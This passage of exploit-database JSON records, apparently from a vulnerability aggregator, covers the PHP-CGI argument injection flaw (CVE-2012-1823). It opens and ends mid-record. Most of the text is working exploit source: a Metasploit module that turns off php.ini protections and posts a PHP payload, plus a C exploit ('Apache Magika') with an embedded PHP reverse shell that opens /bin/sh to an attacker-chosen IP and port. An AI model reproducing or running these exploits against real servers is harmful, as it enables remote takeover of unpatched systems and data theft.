strdup(&#34;/cgi-bin/php4&#34;);\r\n  \r\n  for (i=0;i&#60;ninterpreters;i++) {\r\n   interpreter = interpreters[i];\r\n   if (forceinterpreter) {\r\n     interpreter = strdup(forceinterpreter);\r\n   }\r\n   if (forceinterpreter && i)\r\n    break;\r\n   printf(&#34;%s\\n&#34;, interpreter);\r\n   \r\n   sockfd = socket(AF_INET, SOCK_STREAM, 0);\r\n   if (sockfd &#60; 1) { \r\n\t printf(&#34;socket error (8)\\n&#34;);\r\n\t exit(255);\r\n   }\r\n  \r\n   if (connect(sockfd, (void*)server, sizeof(struct sockaddr_in)) &#60; 0) {\r\n    printf(&#34;connect error (9)\\n&#34;);\r\n    exit(255);\t  \r\n   }\r\n   if (httpsflag) {\r\n    sslconnection = (connection*) malloc(sizeof(connection));\r\n    if (!sslconnection) {\r\n     printf(&#34;malloc error (10)\\n&#34;);\r\n     exit(255);   \r\n    }\r\n    sslconnection-&#62;handle = NULL;\r\n    sslconnection-&#62;ctx = NULL;\r\n\r\n    SSL_library_init();\r\n\r\n    sslconnection-&#62;ctx = SSL_CTX_new(SSLv23_client_method());\r\n    if (!sslconnection-&#62;ctx) {\r\n \t printf(&#34;SSL_CTX_new error (11)\\n&#34;);\r\n     exit(255);\r\n    }\r\n\r\n    sslconnection-&#62;handle = SSL_new(sslconnection-&#62;ctx);\r\n    if (!sslconnection-&#62;handle) {\r\n \t printf(&#34;SSL_new error (12)\\n&#34;);\r\n\t exit(255);   \r\n    }\r\n    if (!SSL_set_fd(sslconnection-&#62;handle, sockfd)) {\r\n \t printf(&#34;SSL_set_fd error (13)\\n&#34;);\r\n     exit(255);\r\n    }\r\n   \r\n    if (SSL_connect(sslconnection-&#62;handle) != 1) {\r\n\t printf(&#34;SSL_connect error (14)\\n&#34;);\r\n     exit(255);       \r\n    }\r\n   }\r\n  \r\n   tmpsize = strlen(phpstr) + strlen(reverseip) + strlen(reverseportstr) + 64;\r\n   tmpstr = (char*)calloc(tmpsize, sizeof(char));\r\n   snprintf(tmpstr, tmpsize, phpstr, reverseip, reverseport);\r\n   \r\n   writesize = strlen(target) + strlen(interpreter) + \r\n     strlen(poststr) + strlen(tmpstr) + 64;\r\n   writestr = (char*)calloc(writesize, sizeof(char));\r\n   snprintf(writestr, writesize, poststr, interpreter,\r\n     target, strlen(tmpstr), tmpstr);\r\n  \r\n   if (!httpsflag) {\r\n\t write(sockfd, writestr, strlen(writestr));\r\n\t readbuf = read_(sockfd);\r\n   } else {\r\n\t SSL_write(sslconnection-&#62;handle, writestr, strlen(writestr));\r\n\t readbuf = sslread(sslconnection);\r\n   }\r\n  \r\n   if (readbuf) {\r\n     printf(&#34;***SERVER RESPONSE***\\n\\n%s\\n\\n&#34;, readbuf);  \r\n   } else {\r\n    printf(&#34;read error (15)\\n&#34;);\r\n    exit(255);\t  \r\n   }\r\n  }\r\n  exit(1);\r\n}\r\n\r\n\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:82805"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-01T00:00:00",
            "published": "2014-07-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-72859",
            "id": "SSV:72859",
            "title": "PHP CGI Argument Injection",
            "type": "seebug",
            "sourceData": "\n                                                ##\r\n# $Id$\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# web site for more information on licensing and terms of use.\r\n#   http://metasploit.com/\r\n##\r\n\r\nrequire &#39;msf/core&#39;\r\n\r\nclass Metasploit3 &#60; Msf::Exploit::Remote\r\n\tRank = ExcellentRanking\r\n\r\n\tinclude Msf::Exploit::Remote::HttpClient\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t&#39;Name&#39;           =&#62; &#39;PHP CGI Argument Injection&#39;,\r\n\t\t\t&#39;Description&#39;    =&#62; %q{\r\n\t\t\t\tWhen run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to\r\n\t\t\t\tan argument injection vulnerability.  This module takes advantage of\r\n\t\t\t\tthe -d flag to set php.ini directives to achieve code execution.\r\n\t\t\t\tFrom the advisory: &#34;if there is NO unescaped &#39;=&#39; in the query string,\r\n\t\t\t\tthe string is split on &#39;+&#39; (encoded space) characters, urldecoded,\r\n\t\t\t\tpassed to a function that escapes shell metacharacters (the &#34;encoded in\r\n\t\t\t\ta system-defined manner&#34; from the RFC) and then passes them to the CGI\r\n\t\t\t\tbinary.&#34;\r\n\t\t\t},\r\n\t\t\t&#39;Author&#39;         =&#62; [ &#39;egypt&#39;, &#39;hdm&#39; ],\r\n\t\t\t&#39;License&#39;        =&#62; MSF_LICENSE,\r\n\t\t\t&#39;Version&#39;        =&#62; &#39;$Revision$&#39;,\r\n\t\t\t&#39;References&#39;     =&#62; [\r\n\t\t\t\t\t[ &#34;CVE&#34;\t, &#34;2012-1823&#34; ],\r\n\t\t\t\t\t[ &#34;URL&#34;\t, &#34;http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/&#34; ],\r\n\t\t\t\t],\r\n\t\t\t&#39;Privileged&#39;     =&#62; false,\r\n\t\t\t&#39;Payload&#39;        =&#62;\r\n\t\t\t\t{\r\n\t\t\t\t\t&#39;DisableNops&#39; =&#62; true,\r\n\t\t\t\t\t# Arbitrary big number. The payload gets sent as an HTTP\r\n\t\t\t\t\t# response body, so really it&#39;s unlimited\r\n\t\t\t\t\t&#39;Space&#39;       =&#62; 262144, # 256k\r\n\t\t\t\t},\r\n\t\t\t&#39;DisclosureDate&#39; =&#62; &#39;May 03 2012&#39;,\r\n\t\t\t&#39;Platform&#39;       =&#62; &#39;php&#39;,\r\n\t\t\t&#39;Arch&#39;           =&#62; ARCH_PHP,\r\n\t\t\t&#39;Targets&#39;        =&#62; [[ &#39;Automatic&#39;, { }]],\r\n\t\t\t&#39;DefaultTarget&#39; =&#62; 0))\r\n\r\n\t\tregister_options([\r\n\t\t\tOptString.new(&#39;TARGETURI&#39;, [false, &#34;The URI to request (must be a CGI-handled PHP script)&#34;]),\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\t# php-cgi -h\r\n\t# ...\r\n\t#   -s               Display colour syntax highlighted source.\r\n\tdef check\r\n\t\turi = target_uri.path\r\n\r\n\t\turi.gsub!(/\\?.*/, &#34;&#34;)\r\n\r\n\t\tprint_status(&#34;Checking uri #{uri}&#34;)\r\n\r\n\t\tresponse = send_request_raw({ &#39;uri&#39; =&#62; uri })\r\n\r\n\t\tif response and response.code == 200 and response.body =~ /\\&#60;code\\&#62;\\&#60;span style.*\\&lt\\;\\?/mi\r\n\t\t\tprint_error(&#34;Server responded in a way that was ambiguous, could not determine whether it was vulnerable&#34;)\r\n\t\t\treturn Exploit::CheckCode::Unknown\r\n\t\tend\r\n\r\n\t\tresponse = send_request_raw({ &#39;uri&#39; =&#62; uri + &#39;?-s&#39;})\r\n\t\tif response and response.code == 200 and response.body =~ /\\&#60;code\\&#62;\\&#60;span style.*\\&lt\\;\\?/mi\r\n\t\t\treturn Exploit::CheckCode::Vulnerable\r\n\t\tend\r\n\r\n\t\tprint_error(&#34;Server responded indicating it was not vulnerable&#34;)\r\n\t\treturn Exploit::CheckCode::Safe\r\n\tend\r\n\r\n\tdef exploit\r\n\t\tbegin\r\n\t\t\targs = [\r\n\t\t\t\t&#34;-d+allow_url_include%3d#{rand_php_ini_true}&#34;,\r\n\t\t\t\t&#34;-d+safe_mode%3d#{rand_php_ini_false}&#34;,\r\n\t\t\t\t&#34;-d+suhosin.simulation%3d#{rand_php_ini_true}&#34;,\r\n\t\t\t\t&#34;-d+disable_functions%3d%22%22&#34;,\r\n\t\t\t\t&#34;-d+open_basedir%3dnone&#34;,\r\n\t\t\t\t&#34;-d+auto_prepend_file%3dphp://input&#34;,\r\n\t\t\t\t&#34;-n&#34;\r\n\t\t\t]\r\n\r\n\t\t\tqs = args.join(&#34;+&#34;)\r\n\t\t\turi = &#34;#{target_uri}?#{qs}&#34;\r\n\r\n\t\t\t# Has to be all on one line, so gsub out the comments and the newlines\r\n\t\t\tpayload_oneline = &#34;&#60;?php &#34; + payload.encoded.gsub(/\\s*#.*$/, &#34;&#34;).gsub(&#34;\\n&#34;, &#34;&#34;)\r\n\t\t\tresponse = send_request_cgi( {\r\n\t\t\t\t&#39;method&#39; =&#62; &#34;POST&#34;,\r\n\t\t\t\t&#39;global&#39; =&#62; true,\r\n\t\t\t\t&#39;uri&#39;    =&#62; uri,\r\n\t\t\t\t&#39;data&#39;   =&#62; payload_oneline,\r\n\t\t\t}, 0.5)\r\n\t\t\thandler\r\n\r\n\t\trescue ::Interrupt\r\n\t\t\traise $!\r\n\t\trescue ::Rex::HostUnreachable, ::Rex::ConnectionRefused\r\n\t\t\tprint_error(&#34;The target service unreachable&#34;)\r\n\t\trescue ::OpenSSL::SSL::SSLError\r\n\t\t\tprint_error(&#34;The target failed to negotiate SSL, is this really an SSL service?&#34;)\r\n\t\tend\r\n\r\n\tend\r\n\r\n\tdef rand_php_ini_false\r\n\t\tRex::Text.to_rand_case([ &#34;0&#34;, &#34;off&#34;, &#34;false&#34; ][rand(3)])\r\n\tend\r\n\r\n\tdef rand_php_ini_true\r\n\t\tRex::Text.to_rand_case([ &#34;1&#34;, &#34;on&#34;, &#34;true&#34; ][rand(3)])\r\n\tend\r\n\r\nend\r\n\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:72859"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution (Multithreaded Scanner) (2). CVE-2012-1823,CVE-2012-2311,CVE-2012-2336. Remote exploit for PHP ...",
            "modified": "2013-11-01T00:00:00",
            "published": "2013-11-01T00:00:00",
            "id": "EDB-ID:40233",
            "href": "https://www.exploit-db.com/exploits/40233/",
            "type": "exploitdb",
            "title": "Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution (Multithreaded Scanner) (2)",
            "sourceData": "",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:40233"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache and PHP remote command execution exploit that leverages php5-cgi.",
            "modified": "2013-10-31T00:00:00",
            "published": "2013-10-31T00:00:00",
            "id": "1337DAY-ID-21429",
            "href": "https://0day.today/exploit/description/21429",
            "type": "zdt",
            "title": "Apache Magicka Remote Code Execution Vulnerability",
            "sourceData": "/* Apache Magica by Kingcope */\r\n/* gcc apache-magika.c -o apache-magika -lssl */\r\n/* This is a code execution bug in the combination of Apache and PHP.\r\nOn Debian and Ubuntu the vulnerability is present in the default install\r\nof the php5-cgi package. When the php5-cgi package is installed on Debian and\r\nUbuntu or php-cgi is installed manually the php-cgi binary is accessible under\r\n/cgi-bin/php5 and /cgi-bin/php. The vulnerability makes it possible to execute\r\nthe binary because this binary has a security check enabled when installed with\r\nApache http server and this security check is circumvented by the exploit.\r\nWhen accessing the php-cgi binary the security check will block the request and\r\nwill not execute the binary.\r\nIn the source code file sapi/cgi/cgi_main.c of PHP we can see that the security\r\ncheck is done when the php.ini configuration setting cgi.force_redirect is set\r\nand the php.ini configuration setting cgi.redirect_status_env is set to no.\r\nThis makes it possible to execute the binary bypassing the Security check by\r\nsetting these two php.ini settings.\r\nPrior to this code for the Security check getopt is called and it is possible\r\nto set cgi.force_redirect to zero and cgi.redirect_status_env to zero using the\r\n-d switch. If both values are set to zero and the request is sent to the server\r\nphp-cgi gets fully executed and we can use the payload in the POST data field\r\nto execute arbitrary php and therefore we can execute programs on the system.\r\napache-magika.c is an exploit that does exactly the prior described. It does\r\nsupport SSL.\r\n/* Affected and tested versions\r\nPHP 5.3.10\r\nPHP 5.3.8-1\r\nPHP 5.3.6-13\r\nPHP 5.3.3\r\nPHP 5.2.17\r\nPHP 5.2.11\r\nPHP 5.2.6-3\r\nPHP 5.2.6+lenny16 with Suhosin-Patch\r\nAffected versions\r\nPHP prior to 5.3.12\r\nPHP prior to 5.4.2\r\nUnaffected versions\r\nPHP 4 - getopt parser unexploitable\r\nPHP 5.3.12 and up\r\nPHP 5.4.2 and up\r\nUnaffected versions are patched by CVE-2012-1823.\r\n*/\r\n/*    .\r\n     /'\\rrq rk\r\n .  // \\\\  .\r\n.x.//fco\\\\-|-\r\n '//cmtco\\\\zt\r\n //6meqrg.\\\\tq\r\n//_________\\\\'\r\nEJPGQO\r\napache-magica.c by Kingcope\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <getopt.h>\r\n#include <sys/types.h>\r\n#include <stddef.h>\r\n#include <openssl/rand.h>\r\n#include <openssl/ssl.h>\r\n#include <openssl/err.h>\r\n#include <netdb.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n\r\ntypedef struct {\r\n  int sockfd;\r\n  SSL *handle;\r\n  SSL_CTX *ctx;\r\n} connection;\r\n\r\nvoid usage(char *argv[])\r\n{\r\n  printf(\"usage: %s <--target target> <--port port> <--protocol http|https> \" \\\r\n  \"<--reverse-ip ip> <--reverse-port port> [--force-interpreter interpreter]\\n\",\r\n   argv[0]);\r\n  exit(1);\r\n}\r\n\r\nchar poststr[] = \"POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F\" \\\r\n \"%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64\" \\\r\n \"+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73\" \\\r\n \"%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E\" \\\r\n \"%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63\" \\\r\n \"%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62\" \\\r\n \"%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74\" \\\r\n \"%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68\" \\\r\n \"%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F\" \\\r\n \"%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63\" \\\r\n \"%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73\" \\\r\n \"%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\\r\\n\" \\\r\n \"Host: %s\\r\\n\" \\\r\n \"User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26\" \\\r\n \"(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\\r\\n\" \\\r\n \"Content-Type: application/x-www-form-urlencoded\\r\\n\" \\\r\n \"Content-Length: %d\\r\\n\" \\\r\n \"Connection: close\\r\\n\\r\\n%s\";\r\nchar phpstr[] = \"<?php\\n\" \\\r\n\"set_time_limit(0);\\n\" \\\r\n\"$ip = '%s';\\n\" \\\r\n\"$port = %d;\\n\" \\\r\n\"$chunk_size = 1400;\\n\" \\\r\n\"$write_a = null;\\n\" \\\r\n\"$error_a = null;\\n\" \\\r\n\"$shell = 'unset HISTFILE; unset HISTSIZE; uname -a; w; id; /bin/sh -i';\\n\" \\\r\n\"$daemon = 0;\\n\" \\\r\n\"$debug = 0;\\n\" \\\r\n\"if (function_exists('pcntl_fork')) {\\n\" \\\r\n\"  $pid = pcntl_fork();  \\n\" \\\r\n\"  if ($pid == -1) {\\n\" \\\r\n\"    printit(\\\"ERROR: Can't fork\\\");\\n\" \\\r\n\"    exit(1);\\n\" \\\r\n\"  }\\n\" \\\r\n\"  if ($pid) {\\n\" \\\r\n\"    exit(0);\\n\" \\\r\n\"  }\\n\" \\\r\n\"  if (posix_setsid() == -1) {\\n\" \\\r\n\"    printit(\\\"Error: Can't setsid()\\\");\\n\" \\\r\n\"    exit(1);\\n\" \\\r\n\"  }\\n\" \\\r\n\"  $daemon = 1;\\n\" \\\r\n\"} else {\\n\" \\\r\n\"  printit(\\\"WARNING: Failed to daemonise.\\\");\\n\" \\\r\n\"}\\n\" \\\r\n\"chdir(\\\"/\\\");\\n\" \\\r\n\"umask(0);\\n\" \\\r\n\"$sock = fsockopen($ip, $port, $errno, $errstr, 30);\\n\" \\\r\n\"if (!$sock) {\\n\" \\\r\n\"  printit(\\\"$errstr ($errno)\\\");\\n\" \\\r\n\"  exit(1);\\n\" \\\r\n\"}\\n\" \\\r\n\"$descriptorspec = array(\\n\" \\\r\n\"   0 => array(\\\"pipe\\\", \\\"r\\\"),\\n\" \\\r\n\"   1 => array(\\\"pipe\\\", \\\"w\\\"),\\n\" \\\r\n\"   2 => array(\\\"pipe\\\", \\\"w\\\")\\n\" \\\r\n\");\\n\" \\\r\n\"$process = proc_open($shell, $descriptorspec, $pipes);\\n\" \\\r\n\"if (!is_resource($process)) {\\n\" \\\r\n\"  printit(\\\"ERROR: Can't spawn shell\\\");\\n\" \\\r\n\"  exit(1);\\n\" \\\r\n\"}\\n\" \\\r\n\"stream_set_blocking($pipes[0], 0);\\n\" \\\r\n\"stream_set_blocking($pipes[1], 0);\\n\" \\\r\n\"stream_set_blocking($pipes[2], 0);\\n\" \\\r\n\"stream_set_blocking($sock, 0);\\n\" \\\r\n\"while (1) {\\n\" \\\r\n\"  if (feof($sock)) {\\n\" \\\r\n\"    printit(\\\"ERROR: Shell connection terminated\\\");\\n\" \\\r\n\"    break;\\n\" \\\r\n\"  }\\n\" \\\r\n\"  if (feof($pipes[1])) {\\n\" \\\r\n\"    printit(\\\"ERROR: Shell process terminated\\\");\\n\" \\\r\n\"    break;\\n\" \\\r\n\"  }\\n\" \\\r\n\"  $read_a = array($sock, $pipes[1], $pipes[2]);\\n\" \\\r\n\"  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\\n\" \\\r\n\"  if (in_array($sock, $read_a)) {\\n\" \\\r\n\"    if ($debug) printit(\\\"SOCK READ\\\");\\n\" \\\r\n\"    $input = fread($sock, $chunk_size);\\n\" \\\r\n\"    if ($debug) printit(\\\"SOCK: $input\\\");\\n\" \\\r\n\"    fwrite($pipes[0], $input);\\n\" \\\r\n\"  }\\n\" \\\r\n\"  if (in_array($pipes[1], $read_a)) {\\n\" \\\r\n\"    if ($debug) printit(\\\"STDOUT READ\\\");\\n\" \\\r\n\"    $input = fread($pipes[1], $chunk_size);\\n\" \\\r\n\"    if ($debug) printit(\\\"STDOUT: $input\\\");\\n\" \\\r\n\"    fwrite($sock, $input);\\n\" \\\r\n\"  }\\n\" \\\r\n\"  if (in_array($pipes[2], $read_a)) {\\n\" \\\r\n\"    if ($debug) printit(\\\"STDERR READ\\\");\\n\" \\\r\n\"    $input = fread($pipes[2], $chunk_size);\\n\" \\\r\n\"    if ($debug) printit(\\\"STDERR: $input\\\");\\n\" \\\r\n\"    fwrite($sock, $input);\\n\" \\\r\n\"  }\\n\" \\\r\n\"}\\n\" \\\r\n\"\\n\" \\\r\n\"fclose($sock);\\n\" \\\r\n\"fclose($pipes[0]);\\n\" \\\r\n\"fclose($pipes[1]);\\n\" \\\r\n\"fclose($pipes[2]);\\n\" \\\r\n\"proc_close($process);\\n\" \\\r\n\"function printit ($string) {\\n\" \\\r\n\"  if (!$daemon) {\\n\" \\\r\n\"    print \\\"$string\\n\\\";\\n\" \\\r\n\"  }\\n\" \\\r\n\"}\\n\" \\\r\n\"exit(1);\\n\" \\\r\n\"?>\";\r\n\r\nstruct sockaddr_in *gethostbyname_(char *hostname, unsigned short port)\r\n{\r\n struct hostent *he;\r\n struct sockaddr_in server, *servercopy;\r\n \r\n if ((he=gethostbyname(hostname)) == NULL) {\r\n  printf(\"Hostname cannot be resolved\\n\");\r\n  exit(255);\r\n }\r\n \r\n servercopy = malloc(sizeof(struct sockaddr_in));\r\n if (!servercopy) {\r\n  printf(\"malloc error (1)\\n\");\r\n  exit(255);\r\n }\r\n memset(&server, '\\0', sizeof(struct sockaddr_in));\r\n memcpy(&server.sin_addr, he->h_addr_list[0],  he->h_length);\r\n server.sin_family = AF_INET;\r\n server.sin_port = htons(port);\r\n memcpy(servercopy, &server, sizeof(struct sockaddr_in));\r\n return servercopy;\r\n}\r\n\r\nchar *sslread(connection *c)\r\n{\r\n  char *rc = NULL;\r\n  int received, count = 0, count2=0;\r\n  char ch;\r\n\r\n  for(;;)\r\n  {\r\n   if (!rc)\r\n    rc = calloc(1024, sizeof (char) + 1);\r\n   else\r\n    if (count2 % 1024 == 0) {\r\n     rc = realloc(rc, (count2 + 1) * 1024 * sizeof (char) + 1);\r\n    }\r\n    received = SSL_read(c->handle, &ch, 1);\r\n    if (received == 1) {\r\n     rc[count++] = ch;\r\n     count2++;\r\n     if (count2 > 1024*5)\r\n    break;\r\n    }\r\n    else\r\n     break;\r\n   }\r\n  return rc;\r\n}\r\n\r\nchar *read_(int sockfd)\r\n{\r\n  char *rc = NULL;\r\n  int received, count = 0, count2=0;\r\n  char ch;\r\n\r\n  for(;;)\r\n  {\r\n   if (!rc)\r\n    rc = calloc(1024, sizeof (char) + 1);\r\n   else\r\n    if (count2 % 1024 == 0) {\r\n     rc = realloc(rc, (count2 + 1) * 1024 * sizeof (char) + 1);\r\n    }\r\n    received = read(sockfd, &ch, 1);\r\n    if (received == 1) {\r\n     rc[count++] = ch;\r\n     count2++;\r\n     if (count2 > 1024*5)\r\n    break;\r\n    }\r\n    else\r\n     break;\r\n   }\r\n  return rc;\r\n}\r\n\r\nvoid main(int argc, char *argv[])\r\n{\r\n  char *target, *protocol, *targetip, *writestr, *tmpstr, *readbuf=NULL,\r\n   *interpreter, *reverseip, *reverseportstr, *forceinterpreter=NULL;\r\n  char httpsflag=0;\r\n  unsigned short port=0, reverseport=0;\r\n  struct sockaddr_in *server;\r\n  int sockfd;\r\n  unsigned int writesize, tmpsize;\r\n  unsigned int i;\r\n  connection *sslconnection;\r\n  printf(\"-== Apache Magika by Kingcope ==-\\n\");\r\n  for(;;)\r\n  {\r\n   int c;\r\n     int option_index=0;\r\n     static struct option long_options[] = {\r\n     {\"target\", required_argument, 0, 0 },\r\n     {\"port\", required_argument, 0, 0 },\r\n     {\"protocol\", required_argument, 0, 0 },\r\n     {\"reverse-ip\", required_argument, 0, 0 },\r\n     {\"reverse-port\", required_argument, 0, 0 },\r\n     {\"force-interpreter\", required_argument, 0, 0 },     \r\n     {0, 0, 0, 0 }\r\n    };\r\n   \r\n   c = getopt_long(argc, argv, \"\", long_options, &option_index);\r\n     if (c < 0)\r\n       break;\r\n     \r\n     switch (c) {\r\n   case 0:\r\n    switch (option_index) {\r\n     case 0:\r\n      if (optarg) {\r\n       target = calloc(strlen(optarg)+1, sizeof(char));\r\n       if (!target) {\r\n      printf(\"calloc error (2)\\n\");\r\n        exit(255);\r\n         }\r\n       memcpy(target, optarg, strlen(optarg)+1);\r\n      }\r\n        break;\r\n       case 1:\r\n        if(optarg)\r\n       port = atoi(optarg);\r\n        break;\r\n       case 2:\r\n        protocol = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!protocol) {\r\n       printf(\"calloc error (3)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(protocol, optarg, strlen(optarg)+1);\r\n        if (!strcmp(protocol, \"https\"))\r\n         httpsflag=1;\r\n        break;\r\n       case 3:\r\n        reverseip = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!reverseip) {\r\n       printf(\"calloc error (4)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(reverseip, optarg, strlen(optarg)+1);       \r\n        break;\r\n       case 4:\r\n      reverseport = atoi(optarg);       \r\n    reverseportstr = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!reverseportstr) {\r\n       printf(\"calloc error (5)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(reverseportstr, optarg, strlen(optarg)+1);         \r\n        break;\r\n       case 5:\r\n        forceinterpreter = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!forceinterpreter) {\r\n       printf(\"calloc error (6)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(forceinterpreter, optarg, strlen(optarg)+1);       \r\n        break;\r\n       default:\r\n        usage(argv);\r\n    }\r\n    break;\r\n   \r\n   default:\r\n    usage(argv);\r\n     }\r\n  }\r\n\r\n  if ((optind < argc) || !target || !protocol || !port ||\r\n      !reverseip || !reverseport){\r\n  usage(argv);\r\n  }\r\n  \r\n  server = gethostbyname_(target, port);\r\n  if (!server) {\r\n   printf(\"Error while resolving hostname. (7)\\n\");\r\n   exit(255);\r\n  }\r\n\r\n  char *interpreters[5];\r\n  int ninterpreters = 5;\r\n  interpreters[0] = strdup(\"/cgi-bin/php\");\r\n  interpreters[1] = strdup(\"/cgi-bin/php5\");\r\n  interpreters[2] = strdup(\"/cgi-bin/php-cgi\");\r\n  interpreters[3] = strdup(\"/cgi-bin/php.cgi\");\r\n  interpreters[4] = strdup(\"/cgi-bin/php4\");\r\n  \r\n  for (i=0;i<ninterpreters;i++) {\r\n   interpreter = interpreters[i];\r\n   if (forceinterpreter) {\r\n     interpreter = strdup(forceinterpreter);\r\n   }\r\n   if (forceinterpreter && i)\r\n    break;\r\n   printf(\"%s\\n\", interpreter);\r\n   \r\n   sockfd = socket(AF_INET, SOCK_STREAM, 0);\r\n   if (sockfd < 1) { \r\n   printf(\"socket error (8)\\n\");\r\n   exit(255);\r\n   }\r\n  \r\n   if (connect(sockfd, (void*)server, sizeof(struct sockaddr_in)) < 0) {\r\n    printf(\"connect error (9)\\n\");\r\n    exit(255);    \r\n   }\r\n   if (httpsflag) {\r\n    sslconnection = (connection*) malloc(sizeof(connection));\r\n    if (!sslconnection) {\r\n     printf(\"malloc error (10)\\n\");\r\n     exit(255);   \r\n    }\r\n    sslconnection->handle = NULL;\r\n    sslconnection->ctx = NULL;\r\n\r\n    SSL_library_init();\r\n\r\n    sslconnection->ctx = SSL_CTX_new(SSLv23_client_method());\r\n    if (!sslconnection->ctx) {\r\n    printf(\"SSL_CTX_new error (11)\\n\");\r\n     exit(255);\r\n    }\r\n\r\n    sslconnection->handle = SSL_new(sslconnection->ctx);\r\n    if (!sslconnection->handle) {\r\n    printf(\"SSL_new error (12)\\n\");\r\n   exit(255);   \r\n    }\r\n    if (!SSL_set_fd(sslconnection->handle, sockfd)) {\r\n    printf(\"SSL_set_fd error (13)\\n\");\r\n     exit(255);\r\n    }\r\n   \r\n    if (SSL_connect(sslconnection->handle) != 1) {\r\n   printf(\"SSL_connect error (14)\\n\");\r\n     exit(255);       \r\n    }\r\n   }\r\n  \r\n   tmpsize = strlen(phpstr) + strlen(reverseip) + strlen(reverseportstr) + 64;\r\n   tmpstr = (char*)calloc(tmpsize, sizeof(char));\r\n   snprintf(tmpstr, tmpsize, phpstr, reverseip, reverseport);\r\n   \r\n   writesize = strlen(target) + strlen(interpreter) + \r\n     strlen(poststr) + strlen(tmpstr) + 64;\r\n   writestr = (char*)calloc(writesize, sizeof(char));\r\n   snprintf(writestr, writesize, poststr, interpreter,\r\n     target, strlen(tmpstr), tmpstr);\r\n  \r\n   if (!httpsflag) {\r\n   write(sockfd, writestr, strlen(writestr));\r\n   readbuf = read_(sockfd);\r\n   } else {\r\n   SSL_write(sslconnection->handle, writestr, strlen(writestr));\r\n   readbuf = sslread(sslconnection);\r\n   }\r\n  \r\n   if (readbuf) {\r\n     printf(\"***SERVER RESPONSE***\\n\\n%s\\n\\n\", readbuf);  \r\n   } else {\r\n    printf(\"read error (15)\\n\");\r\n    exit(255);    \r\n   }\r\n  }\r\n  exit(1);\r\n}\n\n#  0day.today [2018-04-10]  #",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-21429"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache + PHP 5.x - Remote Code Execution (Multithreaded Scanner) (2). CVE-2012-1823,CVE-2012-2311,CVE-2012-2336. Remote exploit for php platform",
            "modified": "2013-10-31T00:00:00",
            "published": "2013-10-31T00:00:00",
            "id": "EDB-ID:29316",
            "href": "https://www.exploit-db.com/exploits/29316/",
            "type": "exploitdb",
            "title": "Apache + PHP 5.x - Remote Code Execution Multithreaded Scanner 2",
